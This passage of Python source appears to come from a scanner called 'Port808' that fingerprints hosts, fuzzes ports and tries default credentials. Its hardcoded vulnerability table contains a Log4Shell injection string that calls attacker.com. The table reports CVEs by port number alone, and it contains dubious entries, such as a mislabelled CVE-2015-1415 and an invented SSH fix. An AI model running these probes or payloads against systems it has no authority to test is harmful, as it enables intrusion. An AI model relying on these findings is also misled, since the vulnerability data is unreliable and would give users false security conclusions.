                    story.append(Paragraph(f"PFS: {'Yes' if result.tls_details.perfect_forward_secrecy else 'No'}", styles['Normal']))
                story.append(Spacer(1, 20))
            doc.build(story)
            return filename
        except:
            return None

class PerformanceOptimizer:
    def __init__(self):
        self.stats = {"scan_time": 0, "ports_per_second": 0, "average_latency": 0, "peak_memory": 0, "cpu_usage": 0}

    def optimize_scan(self, target: str, ports: List[int]) -> Dict[str, Any]:
        recommendations = {"thread_count": 500, "timeout": 3.0, "scan_interval": 0.001, "batch_size": 100, "use_fast_scan": False}
        total_ports = len(ports) if len(ports) != 2 else (ports[1] - ports[0] + 1)
        if total_ports > 10000:
            recommendations["thread_count"] = 1000
            recommendations["use_fast_scan"] = True
        elif total_ports > 5000:
            recommendations["thread_count"] = 750
        elif total_ports > 1000:
            recommendations["thread_count"] = 500
        else:
            recommendations["thread_count"] = 200
        return recommendations

class MonitoringSystem:
    def __init__(self):
        self.events = []
        self.stats = {"start_time": None, "end_time": None, "ports_scanned": 0, "ports_open": 0, "ports_closed": 0, "ports_filtered": 0, "errors": 0}

    def log_event(self, event_type: str, details: Dict[str, Any]):
        event = {"timestamp": datetime.now().isoformat(), "type": event_type, "details": details}
        self.events.append(event)
        LOGGER.info(f"{event_type}: {json.dumps(details)}")

    def update_stats(self, stat_type: str, value: Any):
        self.stats[stat_type] = value

    def get_summary(self) -> Dict[str, Any]:
        return {"events": self.events, "stats": self.stats}

class Port808Scanner:
    def __init__(self, target: str, ports: List[int] = None, protocols: List[str] = None,
                 flags: List[str] = None, threads: int = 500, timeout: float = 3.0,
                 url_scan: bool = False, domain_scan: bool = False):
        self.target = target
        self.ports = ports or [1, 65535]
        self.protocols = protocols or ["TCP"]
        self.flags = flags or ["SYN"]
        self.threads = threads
        self.timeout = timeout
        self.url_scan = url_scan
        self.domain_scan = domain_scan
        self.results: List[ScanResult] = []
        self.domain_info: DomainInfo = None
        self.url_handler = URLHandler()
        self.monitoring = MonitoringSystem()
        self.core_scanner = CoreScanner(target, ports, protocols[0] if protocols else "TCP", flags, threads, timeout)
        self.protocol_fingerprinter = ProtocolFingerprinter()
        self.os_fingerprinter = OSFingerprinter()
        self.firewall_detector = FirewallDetector()
        self.cert_analyzer = CertificateAnalyzer()
        self.dns_recon = DNSRecon()
        self.geo_locator = GeoLocator()
        self.timing_analyzer = TimingAnalyzer()
        self.packet_fuzzer = PacketFuzzer()
        self.proxy_detector = ProxyDetector()
        self.db_scanner = DatabaseScanner()
        self.http_analyzer = HTTPAnalyzer()
        self.tls_analyzer = TLSAnalyzer()
        self.snmp_scanner = SNMPScanner()
        self.performance_optimizer = PerformanceOptimizer()
        self.protocol_tester = AdvancedProtocolTester()
        self.network_scanner = NetworkDetailScanner()
        self.security_tester = SecurityTester()
        self.integration_engine = IntegrationEngine()
        self.report_generator = ReportGenerator()

    def _process_target(self) -> List[str]:
        if self.url_scan or self.domain_scan:
            processed = self.url_handler.process_target(self.target)
            if processed.get('ip_addresses'):
                return processed['ip_addresses']
            return [self.target]
        return [self.target]

    def scan(self) -> List[ScanResult]:
        LOGGER.info(f"Starting scan on {self.target}")
        self.monitoring.update_stats("start_time", datetime.now().isoformat())
        if self.url_scan or self.domain_scan:
            processed = self.url_handler.process_target(self.target)
            self.domain_info = DomainInfo(
                domain=processed.get('dns_info', {}).get('domain', self.target),
                ipv4=processed.get('dns_info', {}).get('ipv4', []),
                ipv6=processed.get('dns_info', {}).get('ipv6', []),
                cname=processed.get('dns_info', {}).get('cname', ''),
                mx=processed.get('dns_info', {}).get('mx', []),
                ns=processed.get('dns_info', {}).get('ns', []),
                txt=processed.get('dns_info', {}).get('txt', []),
                soa=processed.get('dns_info', {}).get('soa', []),
                ptr=processed.get('dns_info', {}).get('ptr', ''),
                subdomains=processed.get('subdomains', []),
                whois=processed.get('whois', {}),
                ssl_info=processed.get('ssl_info', {}),
                technology=processed.get('technology', {}),
                headers=processed.get('technology', {}).get('headers', {}),
                cookies=processed.get('technology', {}).get('cookies', []),
                status_code=200,
                server_info=processed.get('technology', {}).get('server', 'Unknown')
            )
            print(f"{Colors.CYAN}\n🌐 Domain Intelligence:")
            print(f"{Colors.WHITE}   Domain: {Colors.GREEN}{self.domain_info.domain}")
            if self.domain_info.ipv4:
                print(f"{Colors.WHITE}   IPv4: {Colors.YELLOW}{', '.join(self.domain_info.ipv4)}")
            if self.domain_info.ipv6:
                print(f"{Colors.WHITE}   IPv6: {Colors.YELLOW}{', '.join(self.domain_info.ipv6)}")
            if self.domain_info.subdomains:
                print(f"{Colors.WHITE}   Subdomains: {Colors.CYAN}{', '.join(self.domain_info.subdomains[:10])}")
            if self.domain_info.whois.get('registrar', 'Unknown') != 'Unknown':
                print(f"{Colors.WHITE}   Registrar: {Colors.MAGENTA}{self.domain_info.whois.get('registrar')}")
                print(f"{Colors.WHITE}   Created: {Colors.GREEN}{self.domain_info.whois.get('creation_date')}")
                print(f"{Colors.WHITE}   Expires: {Colors.RED}{self.domain_info.whois.get('expiration_date')}")
            tech = self.domain_info.technology
            if tech.get('cms'):
                print(f"{Colors.WHITE}   CMS: {Colors.BLUE}{tech['cms']}")
            if tech.get('framework'):
                print(f"{Colors.WHITE}   Framework: {Colors.MAGENTA}{tech['framework']}")
            if tech.get('server'):
                print(f"{Colors.WHITE}   Server: {Colors.YELLOW}{tech['server']}")
            if tech.get('cdn'):
                print(f"{Colors.WHITE}   CDN: {Colors.CYAN}{tech['cdn']}")
            if tech.get('waf'):
                print(f"{Colors.WHITE}   WAF: {Colors.RED}{tech['waf']}")
            if tech.get('load_balancer'):
                print(f"{Colors.WHITE}   Load Balancer: {Colors.YELLOW}{tech['load_balancer']}")
            if tech.get('js_framework'):
                print(f"{Colors.WHITE}   JS Framework: {Colors.GREEN}{tech['js_framework']}")
        
        targets = self._process_target()
        for target in targets:
            self.core_scanner.target = target
            core_results = self.core_scanner.scan()
            for item in core_results:
                port = item['port']
                latency = item.get('latency', 0.0)
                banner = self._get_banner(target, port, self.protocols[0])
                service = self.protocol_fingerprinter.fingerprint(target, port, banner)
                os_fp = self.os_fingerprinter.fingerprint(target, [port])
                vulnerabilities = self._get_vulnerabilities(port, service)
                risk_score = sum(v.cvss_score for v in vulnerabilities) / len(vulnerabilities) if vulnerabilities else 0
                geo = self.geo_locator.get_location(target)
                dns = self.dns_recon.enumerate(target)
                cert = None
                if port == 443 or port == 8443:
                    cert = self.cert_analyzer.analyze(target, port)
                firewall = self.firewall_detector.detect(target, [port])
                firewall_type = firewall.get(port, "Unknown")
                timing = self.timing_analyzer.analyze(target, port)
                fuzz_results = self.packet_fuzzer.fuzz(target, port)
                proxy = self.proxy_detector.detect(target, port)
                db_info = {}
                if port in [3306, 5432, 6379, 27017, 1433]:
                    db_info = self.db_scanner.scan(target, port)
                http_analysis = None
                if port in [80, 8080, 8000, 8888]:
                    http_analysis = self.http_analyzer.analyze(target, port)
                tls_details = None
                if port in [443, 8443, 465, 993, 995]:
                    tls_details = self.tls_analyzer.analyze(target, port)
                snmp_info = None
                if port == 161:
                    snmp_info = self.snmp_scanner.scan(target, port)
                network_path = self.network_scanner.traceroute(target)
                arp_devices = self.network_scanner.arp_scan(target)
                heartbleed = False
                if port == 443:
                    heartbleed = self.security_tester.test_heartbleed(target, port)
                default_creds = self.security_tester.test_default_credentials(target, port, service.name)
                result = ScanResult(
                    port=port,
                    protocol=self.protocols[0],
                    state="OPEN",
                    service=service,
                    os=os_fp,
                    latency=latency,
                    packets_sent=[],
                    packets_received=[],
                    vulnerabilities=vulnerabilities,
                    risk_score=risk_score,
                    confidence=0.95,
                    analysis={"fuzzing": fuzz_results, "proxy": proxy, "database": db_info, "heartbleed": heartbleed, "arp": arp_devices, "default_creds": default_creds},
                    geolocation=geo,
                    dns_info=dns,
                    certificate=cert,
                    firewall_type=firewall_type,
                    timing_analysis=timing,
                    http_analysis=http_analysis,
                    tls_details=tls_details,
                    network_path=network_path,
                    snmp_info=snmp_info,
                    domain_info=self.domain_info,
                    scan_timestamp=datetime.now().isoformat()
                )
                self.results.append(result)
        self.monitoring.update_stats("end_time", datetime.now().isoformat())
        self.monitoring.update_stats("ports_scanned", len(self.results))
        self.monitoring.update_stats("ports_open", len(self.results))
        return self.results

    def _get_banner(self, ip: str, port: int, protocol: str) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "TCP" else socket.SOCK_DGRAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            probes = CONFIG.get('service_probes', {})
            if port in probes:
                sock.send(probes[port])
            else:
                sock.send(b"\r\n")
            banner = sock.recv(8192).decode('utf-8', errors='ignore')
            sock.close()
            return banner
        except:
            return ""

    def _get_vulnerabilities(self, port: int, service: ServiceFingerprint) -> List[Vulnerability]:
        vulns = []
        port_vulns = {
            21: [Vulnerability(cve_id="CVE-2015-1415", name="FTP Bounce Attack", cvss_score=7.5, cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", type="Information Disclosure", description="FTP server allows PORT command to arbitrary IP addresses", impact="Port scanning and DDoS attacks via FTP relay", exploit="Attacker uses vulnerable FTP server to scan internal networks", fix="Disable PORT command or restrict to local IPs", published="2015-02-01", affected_versions=["2.0", "3.0", "4.0"])],
            22: [Vulnerability(cve_id="CVE-2016-6210", name="OpenSSH Username Enumeration", cvss_score=5.3, cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", type="Information Disclosure", description="Timing side-channel in authentication process", impact="User enumeration, brute-force attacks", exploit="Measure response time differences for valid/invalid users", fix="Use -O CancelAlive and consistent timing responses", published="2016-07-01", affected_versions=["5.3", "6.0", "7.0"])],
            80: [Vulnerability(cve_id="CVE-2021-44228", name="Log4Shell - Apache Log4j RCE", cvss_score=10.0, cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", type="Remote Code Execution", description="JNDI lookup injection in logging", impact="Remote code execution, data theft, ransomware", exploit="User-Agent: ${jndi:ldap://attacker.com/exploit}", fix="Update Log4j to 2.17.0 or disable JNDI lookups", published="2021-12-10", affected_versions=["2.0-2.16"])],
            443: [Vulnerability(cve_id="CVE-2014-0160", name="Heartbleed - OpenSSL Information Leak", cvss_score=7.5, cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", type="Information Disclosure", description="Missing bounds check in heartbeat extension", impact="Memory leak, private keys, passwords, encryption keys", exploit="Send malformed heartbeat requests to leak 64KB memory", fix="Update OpenSSL to 1.0.1g or recompile with fixed version", published="2014-04-07", affected_versions=["1.0.1-1.0.1f"])],
            445: [Vulnerability(cve_id="CVE-2017-0143", name="EternalBlue SMBv1 Remote Code Execution", cvss_score=9.3, cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", type="Remote Code Execution", description="SMBv1 kernel memory corruption in Malformed Request", impact="Wormable ransomware (WannaCry, NotPetya)", exploit="Send crafted SMBv1 packets to port 445", fix="Disable SMBv1, apply MS17-010 patch", published="2017-05-14", affected_versions=["Windows 7-10", "Windows Server 2008-2016"])],
            3389: [Vulnerability(cve_id="CVE-2019-0708", name="BlueKeep RDP", cvss_score=9.8, cvss_vector="CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", type="Remote Code Execution", description="Use-after-free in Remote Desktop Services", impact="Wormable vulnerability, complete system takeover", exploit="Send crafted RDP packets to port 3389", fix="Apply patch or disable RDP", published="2019-05-14", affected_versions=["Windows 7", "Windows Server 2008", "Windows Server 2008 R2"])]
        }
        if port in port_vulns:
            vulns.extend(port_vulns[port])
        if service.name == "Apache" and "2.4" in service.version:
            vulns.append(Vulnerability(cve_id="CVE-2021-44790", name="Apache HTTP Server Request Smuggling", cvss_score=8.2, cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N", type="HTTP Request Smuggling", description="Improper input validation in mod_proxy", impact="Request smuggling, cache poisoning", exploit="Send crafted HTTP requests", fix="Update Apache to 2.4.52 or later", published="2021-12-20", affected_versions=["2.4.0-2.4.51"]))
        return vulns

    def generate_reports(self) -> Dict[str, str]:
        reports = {}
        if not self.results:
            return reports
        html_file = self.report_generator.generate_html(self.results, self.target, self.domain_info)
        reports['html'] = html_file
        csv_file = self.report_generator.generate_csv(self.results, self.target)
        reports['csv'] = csv_file
        pdf_file = self.report_generator.generate_pdf(self.results, self.target)
        if pdf_file:
            reports['pdf'] = pdf_file
        json_file = self.save_full_report()
        reports['json'] = json_file
        return reports

    def save_full_report(self) -> str:
        report = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "config": {"ports": self.ports, "protocols": self.protocols, "flags": self.flags, "threads": self.threads, "timeout": self.timeout, "url_scan": self.url_scan, "domain_scan": self.domain_scan},
            "domain_info": asdict(self.domain_info) if self.domain_info else None,
            "results": []
        }
        for result in self.results:
            report["results"].append({
                "port": result.port,
                "protocol": result.protocol,
                "service": {"name": result.service.name, "version": result.service.version, "vendor": result.service.vendor, "banner": result.service.banner},
                "os": asdict(result.os) if result.os else None,
                "latency": result.latency,
                "risk_score": result.risk_score,
                "confidence": result.confidence,
                "vulnerabilities": [asdict(v) for v in result.vulnerabilities],
                "geolocation": result.geolocation,
                "dns": result.dns_info,
                "firewall_type": result.firewall_type,
                "timing": result.timing_analysis,
                "http_analysis": asdict(result.http_analysis) if result.http_analysis else None,
                "tls_details": asdict(result.tls_details) if result.tls_details else None,
                "snmp_info": asdict(result.snmp_info) if result.snmp_info else None,
                "network_path": result.network_path,
                "analysis": result.analysis
            })
        filename = f"{CONFIG['report_dir']}/port808_report_{self.target.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        return filename

    def display_results(self):
        if not self.results:
            print(f"{Colors.YELLOW}\n[!] No open ports found")
            return
        print(f"{Colors.CYAN}\n{'=' * 80}")
        print(f"{Colors.GREEN}SCAN RESULTS - {self.target}")
        print(f"{Colors.CYAN}{'=' * 80}")
        if self.domain_info:
            print(f"{Colors.WHITE}\n🌐 Domain Intelligence Summary:")
            print(f"{Colors.WHITE}   Domain: {Colors.GREEN}{self.domain_info.domain}")
            if self.domain_info.ipv4:
                print(f"{Colors.WHITE}   IPv4: {Colors.YELLOW}{', '.join(self.domain_info.ipv4)}")
            if self.domain_info.ipv6:
                print(f"{Colors.WHITE}   IPv6: {Colors.YELLOW}{', '.join(self.domain_info.ipv6)}")
            if self.domain_info.subdomains:
                print(f"{Colors.WHITE}   Subdomains Found: {Colors.CYAN}{len(self.domain_info.subdomains)}")
            if self.domain_info.technology.get('cms'):
                print(f"{Colors.WHITE}   CMS: {Colors.BLUE}{self.domain_info.technology['cms']}")
            if self.domain_info.technology.get('framework'):
                print(f"{Colors.WHITE}   Framework: {Colors.MAGENTA}{self.domain_info.technology['framework']}")
        total_vulns = sum(len(r.vulnerabilities) for r in self.results)
        critical_vulns = sum(1 for r in self.results if r.risk_score >= 9.0)
        print(f"{Colors.WHITE}\n📊 Summary:")
        print(f"{Colors.WHITE}   ├── Open Ports: {Colors.GREEN}{len(self.results)}")
        print(f"{Colors.WHITE}   ├── Total CVEs: {Colors.RED}{total_vulns}")
        print(f"{Colors.WHITE}   ├── Critical Vulnerabilities: {Colors.RED}{critical_vulns}")
        print(f"{Colors.WHITE}   ├── Average Risk Score: {Colors.YELLOW}{sum(r.risk_score for r in self.results) / len(self.results):.2f}")
        print(f"{Colors.WHITE}   └── Countries: {Colors.CYAN}{len(set(r.geolocation.get('country', 'Unknown') for r in self.results))}")
        for result in sorted(self.results, key=lambda x: x.port):
            risk_color = Colors.RED if result.risk_score >= 9.0 else Colors.YELLOW if result.risk_score >= 7.0 else Colors.GREEN
            print(f"{Colors.CYAN}\n{'─' * 80}")
            print(f"{Colors.GREEN}📌 Port {result.port}/{result.protocol}")
            print(f"{Colors.CYAN}{'─' * 80}")
            print(f"{Colors.WHITE}\n🔧 Service Information:")
            print(f"{Colors.WHITE}   ├── Service: {Colors.GREEN}{result.service.name} {result.service.version}")
            print(f"{Colors.WHITE}   ├── Vendor: {Colors.CYAN}{result.service.vendor}")
            print(f"{Colors.WHITE}   ├── Banner: {Colors.YELLOW}{result.service.banner[:100]}...")
            print(f"{Colors.WHITE}   └── Auth Methods: {Colors.MAGENTA}{', '.join(result.service.auth_methods) if result.service.auth_methods else 'N/A'}")
            if result.os:
                print(f"{Colors.WHITE}\n🖥️  OS Fingerprinting:")
                print(f"{Colors.WHITE}   ├── OS: {Colors.GREEN}{result.os.name} {result.os.version}")
                print(f"{Colors.WHITE}   ├── Family: {Colors.CYAN}{result.os.family}")
                print(f"{Colors.WHITE}   ├── TTL: {Colors.YELLOW}{result.os.ttl}")
                print(f"{Colors.WHITE}   ├── Window: {Colors.YELLOW}{result.os.window_size}")
                print(f"{Colors.WHITE}   └── Confidence: {Colors.GREEN}{result.os.confidence:.1%}")
            print(f"{Colors.WHITE}\n🌍 Geolocation:")
            print(f"{Colors.WHITE}   ├── Country: {Colors.GREEN}{result.geolocation.get('country', 'Unknown')}")
            print(f"{Colors.WHITE}   ├── City: {Colors.CYAN}{result.geolocation.get('city', 'Unknown')}")
            print(f"{Colors.WHITE}   ├── ISP: {Colors.YELLOW}{result.geolocation.get('isp', 'Unknown')}")
            print(f"{Colors.WHITE}   ├── ASN: {Colors.YELLOW}{result.geolocation.get('asn', 'Unknown')}")
            print(f"{Colors.WHITE}   └── Timezone: {Colors.MAGENTA}{result.geolocation.get('timezone', 'Unknown')}")
            print(f"{Colors.WHITE}\n🛡️  Firewall Detection:")
            print(f"{Colors.WHITE}   └── Type: {Colors.CYAN}{result.firewall_type}")
            print(f"{Colors.WHITE}\n⏱️  Timing Analysis:")
            print(f"{Colors.WHITE}   ├── Latency: {Colors.GREEN}{result.latency:.2f}ms")
            print(f"{Colors.WHITE}   ├── Mean: {Colors.YELLOW}{result.timing_analysis.get('mean', 0):.2f}ms")
            print(f"{Colors.WHITE}   ├── Jitter: {Colors.YELLOW}{result.timing_analysis.get('jitter', 0):.2f}ms")
            print(f"{Colors.WHITE}   ├── Min: {Colors.GREEN}{result.timing_analysis.get('min', 0):.2f}ms")
            print(f"{Colors.WHITE}   └── Max: {Colors.RED}{result.timing_analysis.get('max', 0):.2f}ms")
            if result.network_path:
                print(f"{Colors.WHITE}\n🌐 Network Path:")
                for hop, node in enumerate(result.network_path, 1):
                    print(f"{Colors.WHITE}   ├── Hop {hop}: {Colors.CYAN}{node}")
            if result.analysis.get('arp'):
                print(f"{Colors.WHITE}\n📡 ARP Devices:")
                for ip, mac in result.analysis['arp'].items():
                    print(f"{Colors.WHITE}   ├── {Colors.YELLOW}{ip} -> {Colors.GREEN}{mac}")
            if result.analysis.get('default_creds'):
                print(f"{Colors.RED}\n⚠️  Default Credentials Found:")
                for user, passw in result.analysis['default_creds']:
                    print(f"{Colors.RED}   ├── {user}:{passw}")
            if result.http_analysis:
                print(f"{Colors.WHITE}\n🌐 HTTP Analysis:")
                print(f"{Colors.WHITE}   ├── Status: {Colors.YELLOW}{result.http_analysis.status_code}")
                print(f"{Colors.WHITE}   ├── Server: {Colors.CYAN}{result.http_analysis.server_info}")
                print(f"{Colors.WHITE}   ├── Content-Type: {Colors.GREEN}{result.http_analysis.content_type}")
                print(f"{Colors.WHITE}   ├── Methods: {Colors.MAGENTA}{', '.join(result.http_analysis.methods)}")
                print(f"{Colors.WHITE}   ├── Security Headers:")
                for header, present in result.http_analysis.security_headers.items():
                    print(f"{Colors.WHITE}   │   ├── {header}: {Colors.GREEN if present else Colors.RED}{'✅' if present else '❌'}")
                if result.http_analysis.issues:
                    print(f"{Colors.RED}   └── Issues:")
                    for issue in result.http_analysis.issues:
                        print(f"{Colors.RED}       ├── {issue}")
                if result.http_analysis.sql_injection:
                    print(f"{Colors.RED}       ├── 🔴 SQL Injection Vulnerability Detected!")
                if result.http_analysis.xss:
                    print(f"{Colors.RED}       ├── 🔴 XSS Vulnerability Detected!")
                if result.http_analysis.csrf:
                    print(f"{Colors.YELLOW}       ├── ⚠️ CSRF Protection Missing")
            if result.tls_details:
                print(f"{Colors.WHITE}\n🔒 TLS Analysis:")
                print(f"{Colors.WHITE}   ├── Version: {Colors.CYAN}{result.tls_details.version}")
                print(f"{Colors.WHITE}   ├── Ciphers: {Colors.YELLOW}{', '.join(result.tls_details.cipher_suites)}")
                print(f"{Colors.WHITE}   ├── Perfect Forward Secrecy: {Colors.GREEN if result.tls_details.perfect_forward_secrecy else Colors.RED}{'✅' if result.tls_details.perfect_forward_secrecy else '❌'}")
                print(f"{Colors.WHITE}   ├── Heartbleed: {Colors.RED if result.tls_details.heartbleed else Colors.GREEN}{'⚠️ Vulnerable' if result.tls_details.heartbleed else '✅ Safe'}")
                print(f"{Colors.WHITE}   ├── POODLE: {Colors.RED if result.tls_details.poodle else Colors.GREEN}{'⚠️ Vulnerable' if result.tls_details.poodle else '✅ Safe'}")
            if result.snmp_info:
                print(f"{Colors.WHITE}\n📡 SNMP Analysis:")
                print(f"{Colors.WHITE}   ├── Community: {Colors.RED}{result.snmp_info.community_string}")
                print(f"{Colors.WHITE}   ├── System: {Colors.CYAN}{result.snmp_info.sys_descr}")
                print(f"{Colors.WHITE}   ├── Location: {Colors.YELLOW}{result.snmp_info.sys_location}")
                print(f"{Colors.WHITE}   └── Contact: {Colors.GREEN}{result.snmp_info.sys_contact}")
            if result.certificate:
                print(f"{Colors.WHITE}\n🔒 Certificate Analysis:")
                print(f"{Colors.WHITE}   ├── Subject: {Colors.CYAN}{result.certificate.get('subject', {}).get('commonName', 'Unknown')}")
                print(f"{Colors.WHITE}   ├── Issuer: {Colors.YELLOW}{result.certificate.get('issuer', {}).get('commonName', 'Unknown')}")
                print(f"{Colors.WHITE}   ├── Protocol: {Colors.GREEN}{result.certificate.get('protocol', 'Unknown')}")
                print(f"{Colors.WHITE}   ├── Cipher: {Colors.MAGENTA}{result.certificate.get('cipher', 'Unknown')}")
                print(f"{Colors.WHITE}   └── Expired: {Colors.RED if result.certificate.get('expired') else Colors.GREEN}{'Yes' if result.certificate.get('expired') else 'No'}")
            if result.vulnerabilities:
                print(f"{Colors.RED}\n⚠️  Vulnerabilities ({len(result.vulnerabilities)}):")
                for vuln in result.vulnerabilities:
                    print(f"{Colors.RED}   ├── {vuln.cve_id} [{vuln.cvss_score:.1f}] - {vuln.name}")
                    print(f"{Colors.YELLOW}   ├── Type: {vuln.type}")
                    print(f"{Colors.YELLOW}   ├── Impact: {vuln.impact}")
                    print(f"{Colors.YELLOW}   ├── Published: {vuln.published}")
                    print(f"{Colors.GREEN}   └── Fix: {vuln.fix}")
            else:
                print(f"{Colors.GREEN}\n✅ No known vulnerabilities found")
            print(f"{Colors.WHITE}\n📈 Risk Assessment:")
            print(f"{Colors.WHITE}   ├── Risk Score: {risk_color}{result.risk_score:.2f}/10.0")
            print(f"{Colors.WHITE}   ├── Confidence: {Colors.GREEN}{result.confidence:.1%}")
            print(f"{Colors.WHITE}   └── Status: {Colors.GREEN if result.risk_score < 4.0 else Colors.YELLOW}{'✅ Secure' if result.risk_score < 4.0 else '⚠️  Needs Attention'}")
        print(f"{Colors.CYAN}\n{'=' * 80}")
        print(f"{Colors.GREEN}\n✅ Scan Complete!")

def main():
    print_banner()
    if len(sys.argv) < 2:
        print(f"{Colors.RED}\nUsage: python3 port808.py <target> [options]")
        print(f"{Colors.YELLOW}Options:")
        print(f"{Colors.WHITE}  --ports        Port range (1-1000 or 80,443,8080)")
        print(f"{Colors.WHITE}  --protocols    Protocols (tcp, udp, icmp) - default: tcp")
        print(f"{Colors.WHITE}  --threads      Thread count (1-1000) - default: 500")
        print(f"{Colors.WHITE}  --timeout      Timeout in seconds - default: 3.0")
        print(f"{Colors.WHITE}  --reports      Generate reports (html,pdf,csv)")
        print(f"{Colors.WHITE}  --url          URL/Domain scan mode")
        print(f"{Colors.WHITE}  --domain       Domain intelligence mode")
        print(f"{Colors.WHITE}  --full         Full scan with all features")
        print(f"{Colors.WHITE}  --all          Enable all features")
        print(f"{Colors.CYAN}\nExamples:")
        print(f"{Colors.GREEN}  python3 port808.py https://example.com --ports 1-1000 --url --reports")
        print(f"{Colors.GREEN}  python3 port808.py example.com --ports 80,443 --domain --reports")
        print(f"{Colors.GREEN}  python3 port808.py 192.168.1.1 --ports 1-65535 --reports --all")
        sys.exit(1)
    
    target = sys.argv[1]
    ports = [1, 65535]
    protocols = ["TCP"]
    threads = 500
    timeout = 3.0
    generate_reports = False
    url_scan = False
    domain_scan = False
    
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--ports":
            i += 1
            if ',' in sys.argv[i]:
                ports = [int(p) for p in sys.argv[i].split(',')]
            elif '-' in sys.argv[i]:
                start, end = map(int, sys.argv[i].split('-'))
                ports = [start, end]
            else:
                ports = [int(sys.argv[i])]
        elif sys.argv[i] == "--protocols":
            i += 1
            protocols = [p.upper() for p in sys.argv[i].split(',')]
        elif sys.argv[i] == "--threads":
            i += 1
            threads = min(int(sys.argv[i]), 1000)
        elif sys.argv[i] == "--timeout":
            i += 1
            timeout = float(sys.argv[i])
        elif sys.argv[i] == "--reports":
            generate_reports = True
        elif sys.argv[i] == "--url":
            url_scan = True
        elif sys.argv[i] == "--domain":
            domain_scan = True
        elif sys.argv[i] == "--full":
            url_scan = True
            domain_scan = True
        elif sys.argv[i] == "--all":
            url_scan = True
            domain_scan = True
        i += 1
    
    if url_scan or domain_scan:
        print(f"{Colors.CYAN}\n🌐 URL/Domain Mode Enabled")
        scanner = Port808Scanner(target, ports, protocols, ["SYN"], threads, timeout, url_scan, domain_scan)
    else:
        scanner = Port808Scanner(target, ports, protocols, ["SYN"], threads, timeout, False, False)
    
    results = scanner.scan()
    scanner.display_results()
    
    if generate_reports and results:
        print(f"{Colors.CYAN}\n{'=' * 80}")
        print(f"{Colors.YELLOW}[GENERATING] Reports...")
        reports = scanner.generate_reports()
        for report_type, filename in reports.items():
            print(f"{Colors.GREEN}[+] {report_type.upper()}: {filename}")
    
    if results:
        report_file = scanner.save_full_report()
        print(f"{Colors.GREEN}[+] Full JSON Report: {report_file}")
    
    print(f"{Colors.CYAN}{'=' * 80}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}\n[!] Scan interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}\n[!] Error: {e}")
        sys.exit(1)